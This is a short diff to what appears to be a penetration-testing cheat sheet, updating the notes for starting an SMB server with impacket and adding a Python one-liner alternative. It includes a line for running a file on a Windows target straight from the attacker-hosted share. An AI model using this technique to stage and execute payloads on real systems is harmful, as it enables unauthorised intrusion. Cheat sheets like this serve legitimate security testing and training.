@@ -5632,7 +5632,9 @@ Usage:
 		    <info>Set up a simple SMB Server.
 			    
 Usage:
-	impacket-smbserver [name] `pwd`
+	impacket-smbserver [name] [path]
+(or)
+	python -c 'from impacket import smbserver as i;s=i.SimpleSMBServer();s.addShare("[name]","[path]","");s.start()'
 			   
 (on Windows target)
 	C:&gt; \\[server ip]\[name]\[file to execute]</info>
